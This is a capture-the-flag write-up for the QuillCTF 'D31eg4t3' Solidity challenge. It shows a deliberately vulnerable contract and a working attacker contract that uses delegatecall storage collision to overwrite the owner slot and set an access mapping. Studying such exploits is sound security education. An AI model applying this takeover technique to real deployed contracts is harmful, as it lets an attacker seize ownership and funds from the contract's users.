# [D31eg4t3 Challenge](https://quillctf.super.site/challenges/quillctf-challenges/d31eg4t3)

- Objective of C.T.F.:
1. Become the owner of the contract.
2. Make canYouHackMe mapping to true for your own
address.

## Analisys and Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract D31eg4t3{


    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    modifier onlyOwner{
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns(bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }


    function hacked() public onlyOwner{
        canYouHackMe[msg.sender] = true;
    }
}

/** @audit Step #1: We need to overwrite the 6th slot "address public owner;" in the D31eg4t3 Contract with our address.
We are also given the ability to pass calldata to the delegatecall via bites parameter, but we don't really need it for
the attack. We can just write our code within a fallback function, which will execute when we provide an empty calldata.*/

contract D31eg4t3Attacker {
  uint256 slot0;
  uint256 slot1;
  uint256 slot2;
  uint256 slot3;
  uint256 slot4;
  address owner; // owner
  mapping(address => bool) public yesICan; // canYouHackMe

  function pwn(address target) external {
    (bool success, ) = D31eg4t3(target).hackMe("");
    require(success, "failed.");
  }

  fallback() external {
    owner = tx.origin;
    yesICan[tx.origin] = true;
  }
}

```
